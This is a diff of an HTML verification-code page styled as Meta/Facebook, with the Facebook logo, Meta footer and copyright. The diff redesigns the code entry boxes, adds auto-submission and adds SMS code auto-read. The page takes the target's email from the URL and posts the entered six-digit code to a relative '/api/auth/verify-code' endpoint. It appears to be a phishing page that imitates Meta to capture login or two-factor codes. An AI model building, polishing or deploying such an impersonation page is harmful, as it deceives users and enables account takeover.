@@ -1,357 +1,186 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Verification</title>
-
+<title>Email Verification</title>
 <style>
+/* GLOBAL */
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",Arial,Helvetica,sans-serif;}
+body{background:white;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#1c1e21;}
 
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Segoe UI, Arial;
+/* LOGO */
+.logo-container{display:flex;flex-direction:column;align-items:center;margin-bottom:50px;animation:logoEnter .7s ease;}
+.f-logo{width:72px;height:72px;color:#0064e0;}
+.logo-divider{width:90vw;max-width:720px;height:2px;background:#e4e6eb;margin-top:16px;}
+@keyframes logoEnter{0%{opacity:0;transform:translateY(-18px) scale(.92);}100%{opacity:1;transform:translateY(0) scale(1);}}
+
+/* VERIFY SECTION */
+.verify-container{width:100%;max-width:420px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:16px;}
+.verify-title{font-size:24px;font-weight:700;}
+.verify-desc{font-size:15px;color:#65676b;max-width:320px;line-height:1.4;}
+
+/* OTP BOXES */
+.otp-wrapper{display:flex;justify-content:space-between;margin-top:28px;width:100%;position:relative;}
+.otp-box{flex:1;height:56px;border:1px solid #dddfe2;border-radius:14px;font-size:22px;text-align:center;transition:all .2s ease;display:flex;justify-content:center;align-items:center;color:#1c1e21;background:white;cursor:pointer;transform:scale(1);}
+.otp-box.focused{border-color:#1877f2;box-shadow:0 0 0 3px rgba(24,119,242,.15);}
+.otp-box.typed{animation:popDigit .25s ease;}
+@keyframes popDigit{
+0%{transform:scale(1.4);}
+50%{transform:scale(0.95);}
+100%{transform:scale(1);}
 }
-
-body{
-background:#f0f2f5;
-min-height:100vh;
-display:flex;
-flex-direction:column;
-align-items:center;
-justify-content:center;
-padding:20px;
-}
-
-.title{
-font-size:40px;
-font-weight:900;
-color:#1877f2;
-margin-bottom:25px;
-text-align:center;
-}
-
-.card{
-background:white;
-padding:32px;
-border-radius:12px;
-width:100%;
-max-width:420px;
-text-align:center;
-box-shadow:0 14px 40px rgba(0,0,0,0.15);
-}
-
-.description{
-font-size:15px;
-color:#555;
-margin-top:8px;
-}
-
-/* CODE BOXES */
-
-.code-input{
-display:flex;
-justify-content:space-between;
-margin-top:28px;
-gap:8px;
-}
-
-.code-input input{
-width:48px;
-height:58px;
-font-size:24px;
-text-align:center;
-border:1px solid #ddd;
-border-radius:8px;
-}
-
-.code-input input:focus{
-outline:none;
-border-color:#1877f2;
-box-shadow:0 0 0 3px rgba(24,119,242,0.15);
-}
+.invisible-input{position:absolute;opacity:0;pointer-events:none;}
 
 /* BUTTON */
-
-.confirm-btn{
-margin-top:26px;
-width:100%;
-padding:15px;
-border:none;
-border-radius:8px;
-background:#1877f2;
-color:white;
-font-size:17px;
-font-weight:bold;
-cursor:pointer;
-}
-
-.confirm-btn.loading{
-background:#9bbcf5;
-cursor:not-allowed;
-}
-
-/* RESEND */
-
-.resend{
-margin-top:18px;
-font-size:14px;
-color:#777;
-}
-
-.resend-btn{
-margin-top:12px;
-padding:10px 20px;
-border:none;
-border-radius:6px;
-background:#1877f2;
-color:white;
-font-weight:bold;
-cursor:pointer;
-display:none;
-}
+.btn{width:100%;height:48px;border-radius:24px;border:none;font-size:16px;font-weight:600;cursor:pointer;margin-top:18px;transition:.2s;}
+.btn-primary{background:#0064e0;color:white;}
+.btn-primary:hover{background:#0052ba;}
+.btn-primary.loading{background:#9bbcf5;cursor:not-allowed;}
+.resend-text{margin-top:12px;font-size:14px;color:#777;}
+.resend-btn{margin-top:10px;height:40px;padding:0 20px;border-radius:22px;border:none;background:#0064e0;color:white;font-weight:600;cursor:pointer;display:none;}
 
 /* FOOTER */
+.site-footer{margin-top:40px;text-align:center;font-size:13px;color:#737373;}
+.languages span,.links span{margin:0 8px;cursor:pointer;}
+.languages{margin-bottom:8px;}
+.footer-bottom{margin-top:10px;font-size:12px;color:#8a8d91;}
 
-.site-footer{
-margin-top:40px;
-text-align:center;
-font-size:13px;
-color:#737373;
+/* MOBILE */
+@media(max-width:500px){
+.f-logo{width:60px;height:60px;}
+.otp-box{height:50px;font-size:20px;}
 }
-
-.languages span,
-.links span{
-margin:0 8px;
-cursor:pointer;
-}
-
-.languages{
-margin-bottom:8px;
-}
-
-.footer-bottom{
-margin-top:10px;
-font-size:12px;
-color:#8a8d91;
-}
-
 </style>
-
 </head>
-
 <body>
 
-<h1 class="title">Confirm Code</h1>
-
-<div class="card">
-
-<h2>Check your email for a code</h2>
-
-<p class="description" id="message">
-Please enter the verification code sent to your email.
-</p>
-
-<div class="code-input">
-<input maxlength="1">
-<input maxlength="1">
-<input maxlength="1">
-<input maxlength="1">
-<input maxlength="1">
-<input maxlength="1">
+<!-- LOGO -->
+<div class="logo-container">
+<svg viewBox="0 0 24 24" class="f-logo" fill="currentColor">
+<path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path>
+</svg>
+<div class="logo-divider"></div>
 </div>
 
-<button class="confirm-btn" id="confirmBtn" onclick="confirmCode()">Confirm Code</button>
+<!-- VERIFY SECTION -->
+<div class="verify-container">
+<div class="verify-title">Confirm Code</div>
+<p class="verify-desc" id="message">Enter the 6-digit code sent to your email</p>
 
-<div class="resend">
-Didn't receive the code? <span id="timer">120</span>s
+<!-- OTP Boxes -->
+<div class="otp-wrapper" id="otpWrapper">
+<div class="otp-box" data-index="0"></div>
+<div class="otp-box" data-index="1"></div>
+<div class="otp-box" data-index="2"></div>
+<div class="otp-box" data-index="3"></div>
+<div class="otp-box" data-index="4"></div>
+<div class="otp-box" data-index="5"></div>
+<input type="text" maxlength="6" class="invisible-input" id="otpInput" inputmode="numeric" autocomplete="one-time-code">
 </div>
 
+<button id="confirmBtn" class="btn btn-primary" onclick="confirmCode()">Confirm Code</button>
+<div class="resend-text">Didn't receive the code? <span id="timer">120</span>s</div>
 <button id="resendBtn" class="resend-btn" onclick="resendCode()">Resend Code</button>
-
 </div>
 
+<!-- FOOTER -->
 <div class="site-footer">
-
 <div class="languages">
-<span>English</span>
-<span>Hausa</span>
-<span>Français</span>
-<span>Español</span>
-<span>Português</span>
-<span>العربية</span>
+<span>English</span><span>Hausa</span><span>Français</span><span>Español</span><span>Português</span><span>العربية</span>
 </div>
-
 <div class="links">
-<span>About</span>
-<span>Privacy</span>
-<span>Terms</span>
-<span>Help</span>
-<span>Developers</span>
-<span>Careers</span>
+<span>About</span><span>Privacy</span><span>Terms</span><span>Help</span><span>Developers</span><span>Careers</span>
 </div>
-
-<div class="footer-bottom">
-© 2026 Meta · Privacy · Terms · Help
-</div>
-
+<div class="footer-bottom">© 2026 Meta · Privacy · Terms · Help</div>
 </div>
 
 <script>
-
+/* ================= EMAIL PARAM ================= */
 const params = new URLSearchParams(window.location.search)
 const email = params.get("email")
-
 if(email){
-document.getElementById("message").innerText =
-"Please enter the 6-digit verification code sent to " + email
+document.getElementById("message").innerText = "Enter the 6-digit code sent to " + email
 }
 
-const inputs=document.querySelectorAll(".code-input input")
+/* ================= OTP LOGIC ================= */
+const otpInput = document.getElementById("otpInput")
+const boxes = document.querySelectorAll(".otp-box")
 
-inputs.forEach((input,index)=>{
-
-input.addEventListener("input",()=>{
-
-if(input.value.length===1 && index<5){
-inputs[index+1].focus()
+function renderBoxes(autoFill=false) {
+  let val = otpInput.value
+  boxes.forEach((box, idx)=>{
+    let oldVal = box.textContent
+    box.textContent = val[idx] || ""
+    box.classList.remove("focused","typed")
+    if(idx===Math.min(val.length, boxes.length-1)) box.classList.add("focused")
+    if(val[idx] && oldVal!==val[idx]) box.classList.add("typed")
+  })
+  if(val.length===6) confirmCode()
 }
 
-checkCode()
-
+/* CLICK TO FOCUS AND SHOW GLOW */
+boxes.forEach((box, idx)=>{
+  box.addEventListener("click", ()=>{
+    otpInput.focus()
+    renderBoxes()
+  })
 })
 
+otpInput.addEventListener("input", ()=>renderBoxes())
+otpInput.addEventListener("paste", e=>{
+  e.preventDefault()
+  otpInput.value = e.clipboardData.getData("text").slice(0,6)
+  renderBoxes(true)
 })
 
-inputs.forEach(input=>{
+otpInput.addEventListener("focus", renderBoxes)
+otpInput.focus()
 
-input.addEventListener("paste",(e)=>{
-
-const data=e.clipboardData.getData("text")
-
-if(data.length===6){
-
-e.preventDefault()
-
-for(let i=0;i<6;i++){
-inputs[i].value=data[i]
-}
-
-checkCode()
-
-}
-
-})
-
-})
-
-function checkCode(){
-
-let code=""
-
-inputs.forEach(i=>{
-code+=i.value
-})
-
-if(code.length===6){
-confirmCode()
-}
-
-}
-
+/* ================= TIMER ================= */
 let seconds=120
 const timer=document.getElementById("timer")
 const resendBtn=document.getElementById("resendBtn")
-
 const interval=setInterval(()=>{
-
 seconds--
-
 if(seconds<=0){
-
 clearInterval(interval)
-
 timer.innerText="0"
-
 resendBtn.style.display="inline-block"
-
 return
-
 }
-
 timer.innerText=seconds
-
 },1000)
 
-function resendCode(){
-location.reload()
-}
+/* ================= RESEND ================= */
+function resendCode(){ location.reload() }
 
+/* ================= CONFIRM CODE ================= */
 async function confirmCode(){
-
 const btn=document.getElementById("confirmBtn")
-
-let code=""
-
-inputs.forEach(i=>{
-code+=i.value
-})
-
-if(code.length!==6){
-return
-}
-
-btn.classList.add("loading")
-btn.innerText="Verifying..."
-
+let code=otpInput.value
+if(code.length!==6) return
+btn.classList.add("loading"); btn.innerText="Verifying..."
 try{
-
-const response=await fetch("/api/auth/verify-code",{
-
+const response = await fetch("/api/auth/verify-code",{
 method:"POST",
 credentials:"include",
-
-headers:{
-"Content-Type":"application/json"
-},
-
-body:JSON.stringify({
-email:email,
-code:code
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({email:email,code:code})
 })
-
-})
-
-const data=await response.json()
-
-if(data.success){
-
-alert("Code verified")
-
-}else{
-
-alert("Verification failed")
-
+const data = await response.json()
+if(data.success){ alert("Code verified") } else { alert("Verification failed") }
+btn.classList.remove("loading"); btn.innerText="Confirm Code"
+}catch(err){alert("Server error"); btn.classList.remove("loading"); btn.innerText="Confirm Code"}
 }
 
-btn.classList.remove("loading")
-btn.innerText="Confirm Code"
-
-}catch(err){
-
-alert("Server error")
-
-btn.classList.remove("loading")
-btn.innerText="Confirm Code"
-
+/* ================= OTP AUTO READ ================= */
+if("OTPCredential" in window){
+navigator.credentials.get({otp:{transport:["sms"]},signal:new AbortController().signal})
+.then(otp=>{
+if(otp && otp.code){ otpInput.value=otp.code; renderBoxes(true) }
+}).catch(()=>{})
 }
-
-}
-
 </script>
 
 </body>
